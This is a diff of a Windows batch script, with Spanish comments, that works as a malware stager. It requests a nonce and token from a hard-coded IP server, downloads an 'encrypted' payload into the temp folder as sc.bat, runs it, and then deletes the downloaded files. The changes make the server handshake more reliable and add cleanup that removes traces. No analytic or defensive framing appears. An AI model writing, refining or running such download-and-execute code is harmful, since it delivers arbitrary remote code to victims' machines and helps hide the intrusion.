@@ -1,18 +1,31 @@
 ÿþ&cls
 @echo off
-setlocal
+setlocal enabledelayedexpansion
 
 set BASE=http://82.29.153.101:8080
 set FILE=%temp%\sc.bat
 
-REM ===== TS =====
-for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i
+REM ===== AUTH =====
+curl -s "%BASE%/auth/key" -o "%temp%\auth.json"
+if errorlevel 1 exit /b 1
 
-REM ===== KEY =====
-for /f %%i in ('curl -s "%BASE%/auth/key?ts=%TS%"') do set KEY=%%i
+for /f "usebackq delims=" %%i in (`powershell -NoP -Command "(Get-Content '%temp%\auth.json' | ConvertFrom-Json).nonce"`) do set NONCE=%%i
+for /f "usebackq delims=" %%i in (`powershell -NoP -Command "(Get-Content '%temp%\auth.json' | ConvertFrom-Json).token"`) do set TOKEN=%%i
+
+del "%temp%\auth.json"
+
+if "%NONCE%"=="" exit /b 1
+if "%TOKEN%"=="" exit /b 1
 
 REM ===== PAYLOAD =====
-curl -s -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%FILE%"
+curl -s -H "X-Nonce: %NONCE%" -H "X-Token: %TOKEN%" "%BASE%/payload/encrypted" -o "%FILE%"
+if errorlevel 1 exit /b 1
 
-REM ===== EXEC (sincrono) =====
+REM Validar archivo
+for %%A in ("%FILE%") do if %%~zA==0 exit /b 1
+
+REM ===== EXEC =====
 call "%FILE%"
+
+REM ===== CLEANUP =====
+del "%FILE%"
